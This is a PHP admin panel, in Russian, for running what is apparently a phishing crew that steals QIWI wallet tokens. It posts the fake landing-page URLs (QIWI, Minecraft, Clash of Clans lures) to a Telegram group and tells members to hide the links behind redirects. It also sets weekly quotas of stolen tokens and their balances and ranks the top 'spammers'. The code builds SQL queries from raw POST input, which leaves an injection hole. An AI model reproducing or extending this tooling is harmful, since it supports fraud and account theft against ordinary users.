<?PHP

    $db = mysqli_connect("localhost", "", "", "");
	$tokeny = "" ; // token бота телеги
	$chat_id = "-237444129"; // айди чата админа
	$spam_id = "-297679794"; // айди чата со спамерами


    if(isset($_GET['lend'])) {
        $txt = urlencode("На данный момент существует 3 лендинга\nQIWI original: easybonus.xyz/reg.php?ref=ТвойНик\nMinecraft: freedonate.easybonus.xyz/?ref=ТвойНик\nClash of clans: easybonus.xyz/clash/send.php?ref=ТвойНик\nСалон красоты: easybonus.xyz/krasota/?ref=ТвойНик\n\nВместо 'ТвойНик' пиши свой никнейм Telegram\nИспользуйте редиректы, для скрытия ссылки!");
        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$spam_id}&parse_mode=html&text={$txt}", "r");
        header("Location: bot.php");
    }
    if(isset($_GET['norm'])) {
        $txt = urlencode("Чтобы стать успешным спамером, нужно прежде всего выполнять норму..\n3 токена - сумма балансов на 300+ рублей\n5 токенов - сумма балансов на 300- рублей\n\nВ воскресенье, все кто не выполнил норму - кик");
        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$spam_id}&parse_mode=html&text={$txt}", "r");
        header("Location: bot.php");
    }
    if(isset($_POST['spamer'])){
        mysqli_query($db, "INSERT INTO spamers (`spamer`) VALUES ('".$_POST['spamer']."')");
        header("Location: bot.php");
    }
    if(isset($_POST['spamerd'])){
        mysqli_query($db, "DELETE FROM spamers WHERE `spamer`='".$_POST['spamerd']."'");
        header("Location: bot.php");
    }
    if(isset($_GET['top'])){
        $linkads = mysqli_query($db,"SELECT * FROM spamers ORDER BY balance DESC LIMIT 5");
        $txt = urlencode("Список ТОП 5 спамеров");
        $top = 1;
        while ($resone = mysqli_fetch_array($linkads)) {
            $txt .= urlencode("\nПозиция #".$top." | Спамер: ".$resone['spamer']." | Всего токенов: ".$resone['tokens']." | Общий баланс токенов: ".$resone['balance']);
        }
        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$spam_id}&parse_mode=html&text={$txt}", "r");
        header("Location: bot.php");
    }
    if(isset($_GET['enable'])) {
        $fp = fopen("enable.txt", 'a'); //Открываем файл в режиме записи
        if (file_get_contents("enable.txt") == "true") {
            ftruncate($fp, 0);
            fwrite($fp, "false");
        } elseif(file_get_contents("enable.txt") == "false") {
            ftruncate($fp, 0);
            fwrite($fp, "true");
        }
        fclose($fp);
        header("Location: bot.php");
    } 
	
?>

<DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Админ панель Q1W1</title>
    </head>
    <body bgcolor="#e6e6fa">
    <div align="center">
        <h1>Одмен панель Q1W1</h1>
        <br>
        <p>Выберите действие..</p>
        <br>
        <p>Статус бота: <?php echo file_get_contents("enable.txt"); ?></p>
        <br>
        <a href="?enable"><button>Включить/Отключить бота Telegram</button></a>
        <br>
        <a href="?lend"><button>Отправить в телеграм информацию о фейках</button></a>
        <br>
        <a href="?norm"><button>Отправить в телеграм информацию о нормах</button></a>
        <br>
        <a href="?top"><button>Отправить в телеграм ТОП 5 спамеров</button></a>
        <br>
        <form method="POST">
            <h3>Добавить спамера</h3>
            <input type="text" name="spamer" placeholder="Логин Telegram">
            <input type="submit" value="Добавить">
        </form>
        <br>
        <form method="POST">
            <h3>Удалить спамера</h3>
            <input type="text" name="spamerd" placeholder="Логин Telegram">
            <input type="submit" value="Удалить">
        </form>
        <br>
        <h3>Список всех скамеров</h3>
        <?php
        $linkads = mysqli_query($db,"SELECT * FROM spamers ORDER BY balance ");
        while ($resone = mysqli_fetch_array($linkads)) {
            echo "<br>Спамер: ".$resone['spamer']." | Всего токенов: ".$resone['tokens']." | Общий баланс токенов: ".$resone['balance'];
        }
        ?>
    </div>
    </body>
    </html>